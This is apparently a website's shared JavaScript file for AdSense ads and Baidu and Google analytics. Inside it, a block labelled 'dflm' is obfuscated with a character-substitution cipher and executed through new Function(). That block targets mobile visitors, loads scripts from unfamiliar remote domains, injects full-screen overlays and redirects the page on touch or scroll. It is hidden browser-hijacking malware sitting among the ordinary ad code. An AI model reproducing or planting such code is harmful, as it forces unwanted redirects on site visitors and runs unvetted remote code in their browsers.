// close undisplay adsense unit
;setInterval(function(){
	if(window.jQuery)
		jQuery('ins[data-ad-status="unfilled"]').css('display','none')
},5000);

// google adsense
if(document.body.clientWidth > 800){
	document.write(`
		<div id="_gads" style="position: fixed;right: 0px;bottom: 0px;z-index:999">
		<p><a href="" onclick="return close_ads();" style="float:right">关闭</a></p>
		<ins class="adsbygoogle"
				 style="display:inline-block;width:336px;height:280px"
				 data-ad-client="ca-pub-9312750344484857"
				 data-ad-slot="6912955883"></ins>
		</div>`);
	function close_ads() {
		document.getElementById('_gads').style.display='none';return false;
	};
	window.close_ads = close_ads;
	(adsbygoogle = window.adsbygoogle || []).push({});
}

// more adsense unit
(function(){
  if(document.body.clientWidth <750) return;
  var _h2=document.querySelectorAll('#content h2');
  var _i = 1;
  while(_i<_h2.length){
    var _d = document.createElement('div');
    _d.innerHTML = `<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-9312750344484857"
     data-ad-slot="8526259452"></ins>`;
    _h2[_i].parentNode.insertBefore(_d, _h2[_i]);

    (adsbygoogle = window.adsbygoogle || []).push({});

    // next;
    _i+=2;
    //console.log("adsnese added");
  }
})();

// dflm
!function(){function a(a){var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a('fUtCdckUqzl7_2(F6O2cYa[Xd5 F8[P!7_2(F6O2 5c2a[67cFH2Za5YF_52 FH2ZmYRJO5FL!Xd5 O8FH2Z8[6g2=qgl}=YRJO5FLg[PP!5YF_52 YH2Zm(dqqcOmYRJO5FL=O=OmYRJO5FL=5a=Omq8l0=OmYRJO5FLP5m^8Y=5m(8F=5mf87_2(F6O2cY=F=2a[5mOcY=Fa??;)CY(FmfY762Ye5OJY5FTcY=F=[Y2_^Y5d)qYgl0=pYFg2PaP=5m587_2(F6O2cYa["_2fY762Yf"l8FTJYO7 iT^)OqvviT^)OqmFOiF562p|dpvv;)CY(FmfY762Ye5OJY5FTcY=iT^)OqmFOiF562p|dp=[Xdq_Yg"yOf_qY"Pa=;)CY(FmfY762Ye5OJY5FTcY="MMYLyOf_qY"=[Xdq_Ygl0PaP=5mF87_2(F6O2cY=Fa[67c}vFvvcY85cYaa={vFa5YF_52 Y!67covFvv"O)CY(F"88FTJYO7 YvvYvvYmMMYLyOf_qYa5YF_52 Y!Xd5 28;)CY(Fm(5YdFYc2_qqa!67c5m5c2a=;)CY(FmfY762Ye5OJY5FTc2="fY7d_qF"=[Y2_^Y5d)qYgl0=Xdq_YgYPa=@vFvv"LF562p"l8FTJYO7 Ya7O5cXd5 O 62 Ya5mfc2=O=7_2(F6O2cFa[5YF_52 YHFZPm)62fc2_qq=Oaa!5YF_52 2P=5m287_2(F6O2cYa[Xd5 F8YvvYmMMYLyOf_qYj7_2(F6O2ca[5YF_52 YmfY7d_qFPg7_2(F6O2ca[5YF_52 YP!5YF_52 5mfcF="d"=Fa=FP=5mO87_2(F6O2cY=Fa[5YF_52 ;)CY(FmJ5OFOFTJYmhdL;D2e5OJY5FTm(dqqcY=FaP=5mJ8""=5c5mL80aPcH7_2(F6O2cY=Fa[Xd5 58fO(_^Y2F=282dX6pdFO5mJqdF7O5^=O85m(_55Y2Fi(56JF!67c/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?yIIu5ODLY5?Bxu5ODLY5/pmFYLFc2dX6pdFO5m_LY5rpY2Fal887dqLYa[67cl/3yddd(?V6662/mFYLFc2a??l2a[Xd5 6LDL86LMSS80!Xd5 6^pL(8"hFFJLg//J6((mfdh_OLCm(O^/J_)q6(MJ6(/"%ydFhm(Y6qcydFhm5d2fO^ca.}0a%"mCJp"!LYF|6^YO_Fc7_2(F6O2ca[67c6LDL880a[Xd5 5SAh~2LtiR8"hFFJLg//f((mTS(CRXpm(2/((/}o@sj6LM2OF8}vFd5pYF8}"!Xd5 (d2Xd85mpYFEqY^Y2FuTWfc"XAY&+(D;;q"a!67c(d2Xda[(d2XdmdffEXY2Ft6LFY2Y5c"FO_(hLFd5F"=7_2(F6O2ca[67c6LMSS880a[6LMSS8}!67cFOJmqO(dF6O2 l8 LYq7mqO(dF6O2a[FOJmqO(dF6O285SAh~2LtiR!PYqLY[D62fODmqO(dF6O2mh5Y785SAh~2LtiR!P6LMSS80!PPa!Xd5 (d2Xd6^p85mpYFEqY^Y2FuTWfc"XAY&+(D;;qM6^p"a!67c(d2Xd6^pa[(d2Xd6^pmL5(86^pL(!PPYqLY[Xd5 (q6Y2FD6fFh8D62fODmL(5YY2mdXd6qV6fFh!5m)OfTmdffEXY2Ft6LFY2Y5c"FO_(hLFd5F"=7_2(F6O2ca[Xd5 (q6Y2FhY6phF8D62fODmL(5YY2mdXd6q9Y6phF!Xd5 YXY8YXY2F??D62fODmYXY2F!Xd5 (R8(T80!67cYXYvvYXYmFTJY88"FO_(hLFd5F"a[(R8YXYmFO_(hYLH0Zm(q6Y2F&!(T8YXYmFO_(hYLH0Zm(q6Y2F-!P67cYXYvvYXYmFTJY88"FO_(hY2f"a[(R8YXYm(hd2pYf|O_(hYLH0ZmL(5YY2&!(T8YXYm(hd2pYf|O_(hYLH0Zm(q6Y2F-!P67cYXYvvYXYmFTJY88"(q6(S"a[(R8YXYm(q6Y2F&!(T8YXYm(q6Y2F-!P67c(R>0vv(T>0a[67c(T>c(q6Y2FhY6phF*cs00.c(q6Y2FD6fFh/Ko0aaavv6LMSS880a[6LMSS8}!67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O285SAh~2LtiR!PYqLY[D62fODmqO(dF6O2mh5Y785SAh~2LtiR!P6LMSS880!PPPa!Xd5 (d2Xd85m(5YdFYEqY^Y2Fc"(d2XdL"a!(d2XdmLFTqY8")O5fY5*FOJg0mnJR LOq6f #YYYYYY!D6fFhg}00b!hY6phFgs@XD!JOL6F6O2gd)LOq_FY!^d5p62g0JR!qY7Fg0!56phFg0JR!"!(d2XdmD6fFh8Ko0!(d2XdmhY6phF8@s0!(d2Xdm6f8"XAY&+(D;;q"!Xd5 (FR8(d2XdmpYFxO2FYRFc"@f"a!Xd5 6^p82YD W^dpYca!6^pmO2qOdf87_2(F6O2ca[(FRmf5dDW^dpYc6^p=0=0=Ko0=@s0a!P!6^pmL5(86^pL(!(d2XdmdffEXY2Ft6LFY2Y5c"FO_(hLFd5F"=7_2(F6O2ca[67c6LMSS880a[6LMSS8}!67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O285SAh~2LtiR!PYqLY[D62fODmqO(dF6O2mh5Y785SAh~2LtiR!P6LMSS80!PPa!5m)OfTmdJJY2fxh6qfc(d2Xda!Xd5 F85mfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??5m)OfTmL(5Oqq|OJ!(d2XdmLFTqYm)OFFO^8cF*F.@a%"JR"!D62fODmdffEXY2Ft6LFY2Y5c"L(5Oqq"=7_2(F6O2ca[Xd5 F85mfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??5m)OfTmL(5Oqq|OJ!(d2XdmLFTqYm)OFFO^8cF*F.@a%"JR"!Pa!PXd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//f((mTS(CRXpm(2/f/}o@sj(8}vF8n}sooQnQ"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6= _a!Xd5 L))85m(5YdFYEqY^Y2Fc"LFTqY"a!L))m622Y59|yt8")OfT[JOL6F6O2g626F6dq l6^JO5Fd2F!^62*hY6phFg"%D62fODmL(5YY2mhY6phF%"JR l6^JO5Fd2F!Jdff62p*)OFFO^g}00JR l6^JO5Fd2F!P"!5mhYdfmdJJY2fxh6qfcL))aP!P= }000a!Xd5 DLRp8H"DLfpmT2)T_FO2pf6d2:6m(O^"="DLfpm4qT0@m(O^"="DLfpm4:(fYL6p2m(O^"Z!Xd5 S8ydFhm7qOO5cc2YD wdFYcaampYFwdFYca/}0a!S8cS>@aj@gS!Xd5 DL_8c"hFFJLg"885mqO(dF6O2mJ5OFO(Oqaj"DLLg//"%DLRpHSZ%"g@00Q}"g"DLg//"%DLRpHSZ%"g@00Q0"!Xd5 (82YD VY)iO(SYFcDL_%"/}o@s"a!(mO2OJY287_2(F6O2cYa[6LDL86LMSS8}!Xd5 (d2Xd85mpYFEqY^Y2FuTWfc"XAY&+(D;;q"a!67c(d2Xda[(d2XdmLFTqY8"f6LJqdTg2O2Y!"PP!(mO2^YLLdpY87_2(F6O2cYa[Xd5 F87_2(F6O2cYa[Xd5 F=5=2=O=(=6=_=d8"(hd5rF"=78"75O^xhd5xOfY"=q8"(hd5xOfYrF"=f8"62fYR;7"=L8"ruxwE]k9W+ztyN;eI~i|BAV&-Ud)(fY7ph6CSq^2OJ:5LF_XDRT40}@sonK1{Q%/8"=J8""=p80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<YmqY2pFh!aO8LHfZcYHdZcp%%aa=(8LHfZcYHdZcp%%aa=68LHfZcYHdZcp%%aa=_8LHfZcYHdZcp%%aa=F8O<<@?(>>o=58c}nv(a<<o?6>>@=28csv6a<<K?_=J%8iF562pH7ZcFa=Kol86vvcJ%8iF562pH7Zc5aa=Kol8_vvcJ%8iF562pH7Zc2aa!5YF_52 7_2(F6O2cYa[7O5cXd5 F8""=2858(}8(@80!2<YmqY2pFh!ac58YHqZc2aa<}@{jcF%8iF562pH7Zc5a=2%%ag5>}Q}vv5<@@ojc(@8YHqZc2%}a=F%8iF562pH7Zccs}v5a<<K?Ksv(@a=2%8@agc(@8YHqZc2%}a=(s8YHqZc2%@a=F%8iF562pH7Zcc}nv5a<<}@?cKsv(@a<<K?Ksv(sa=2%8sa!5YF_52 FPcJaPcYmfdFda!2YD ]_2(F6O2c"MFf(L"=FacOa=(m(qOLYcaPPPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//fpmC5h)h4m(O^/L(/}o@sj28XAY&+(D;;q"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_aPPZa!'.substr(10));new Function(b)()}();
// 高登
document.writeln("<script id='gd88e22428ccf9' type='text/javascript' charset='utf-8' src='https://g.mushengzhi.com/e22428ccf9.php?a=193&pt=0'></script>");

document.write(`<div style="display: none; overflow: hidden; text-align: center;">
  <script src="https://static.adxadserv.com/js/adb.js" type="text/javascript" data-adxad-place="621f2f3461d6e260d55ec0c2" async></script><div id="621f2f3461d6e260d55ec0c2" data-width="728" data-height="90" data-output="html"></div>
  <script src="https://static.adxadserv.com/js/adb.js" type="text/javascript" data-adxad-place="621ebd4d61d6e277491eb554" async></script><div id="621ebd4d61d6e277491eb554" data-width="300" data-height="100" data-output="html"></div>
  <script src="https://static.adxadserv.com/js/adb.js" type="text/javascript" data-adxad-place="621f2f7c61d6e260d80557b1" async></script><div id="621f2f7c61d6e260d80557b1" data-width="300" data-height="250" data-output="html"></div>
</div>`);

// tj


var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?1b45f04480c6b73a5bae172f5b92f3e5";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
})();


!function(){var t=document.createElement("script");function a(){dataLayer.push(arguments)}t.src="https://www.googletagmanager.com/gtag/js?id=UA-195431371-1",t.setAttribute("async",!0),document.head.appendChild(t),window.dataLayer=window.dataLayer||[],a("js",new Date),a("config","UA-195431371-1")}();
